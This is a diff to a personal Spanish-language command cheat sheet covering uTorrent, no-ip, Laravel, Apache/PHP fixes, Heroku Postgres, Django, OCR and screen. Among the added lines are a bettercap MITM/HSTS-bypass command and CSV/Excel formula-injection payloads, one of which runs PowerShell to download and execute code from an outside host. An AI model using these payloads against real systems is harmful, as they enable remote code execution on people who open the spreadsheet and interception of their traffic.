@@ -63,6 +63,7 @@ wget http://download-new.utorrent.com/endpoint/utserver/os/linux-x64-ubuntu-13-0
 sudo ln -s /opt/utorrent-server-alpha-v3_3/utserver /usr/bin/utserver //utorrent, paso 2
 utserver -settingspath /opt/utorrent-server-alpha-v3_3/ & //utorrent, paso 3
 ip:8080/gui //utorrent, paso 4
+
 wget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz // dns dinamico noip2, paso 1
 tar xf noip-duc-linux.tar.gz //descomprimir, dns dinamico, no ip2 paso 2
 cd noip-2.1.9-1/ //noip2, paso 3
@@ -71,6 +72,7 @@ make install // noip2, paso 4
 /usr/local/bin/noip2 // noip2, paso 5, iniciar el servicio, dns dinamico
 
 getcomposer.org //#laravel, composer ,getcomposer.org, composer gestiona dependencias por proyecto
+mv composer.phar /usr/local/bin/composer
 composer global require "laravel/installer" //install #laravel con composer
 nano ~/.bashrc (y agregar) export PATH="$HOME/.config/composer/vendor/bin:$PATH"//#laravel install
 sudo apt-get install php7.0-zip //#laravel install, dependencia
@@ -95,6 +97,12 @@ php artisan serve //#laravel, #php, levanta server localhost:8000, en la carpeta
 sudo apt-get install mysql-server //#laravel, #mysql instalacion
 mysql -uroot -p //#laravel, #mysql, create database blog, use blog, luego modificar el archivo .env con esos parametros
 
+
+
+tail -f /var/log/apache2/error.log //error log apache2
+sudo a2enmod proxy_fcgi setenvif & sudo a2enconf php7.0-fpm & sudo service apache2 restart //php7 en apache2 
+sudo apt-get install php-mbstring // apache, problemas con utf-8 mbstring 
+sudo apt-get install php7.0-xml // error 500, Uncaught Error: Call to undefined function utf8_decode() in ..
 
 
 ll | wc -l // contar las lineas de (ls -la)
@@ -145,4 +153,62 @@ sudo reboot
 
 
 float:right; //#css #alineacion #align
+apt-get install linux-headers-amd64 //kali guest-additions 1
+apt-get install linux-image-4.9.0-kali4-amd64 //kali guest-additions 2
+reboot //kali guest-additions 3
+apt-get install virtualbox-guest-x11 -y //kali guest additions 4
+
+bettercap -I wlan0 -T 192.168.1.42  --no-discovery --proxy --proxy-port 80 --proxy-https --proxy-https-port 443 -P POST --use-mac CC:1A:FA:71:91:82 //hsts bypass
+
+
+https://www.virustotal.com/ //#information_gathering, #dominios, #domains #subdominios
+
+Netlogon Service (NP-In) // regla que bloquea psexec windows 10
+
+icanhazip.com //saber ip publica
+
+--heroku--
+
+
+--heroku-postgres--
+heroku pg:info //data size , status, plan, tamaño de almacenamiento
+//To measure the cache hit ratio for tables:
+SELECT
+    'cache hit rate' AS name,
+     sum(heap_blks_hit) / (sum(heap_blks_hit) + sum(heap_blks_read)) AS ratio
+FROM pg_statio_user_tables;
+//or the cache hit ratio for indexes:
+SELECT
+    'index hit rate' AS name,
+    (sum(idx_blks_hit)) / sum(idx_blks_hit + idx_blks_read) AS ratio
+FROM pg_statio_user_indexes
+
+
+--django--
+django-admin startproject mysite
+python manage.py startapp polls
+python manage.py runserver
+
+
+
+
+
+--OCR reconocimiento de caracteres en imagenes--
+sudo apt-get install tesseract
+convert WebUserimagen.jpg -colorspace Gray -blur 0 -level 0,79% out2.png
+tesseract -psm 8 out2.png -
+
+
+
+=cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0 
+@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0 //#payload excel csv
+openssl s_client -connect 179.27.35.202:443 //cliente https 
+
+--screen:
+screen
+te pone un aviso, le das enter y quedas adentro
+para salir tocas: Cntrl+A y a parte, solo la D
+con screen -list las listas
+para volver: screen -r [nombre de sesion]
 
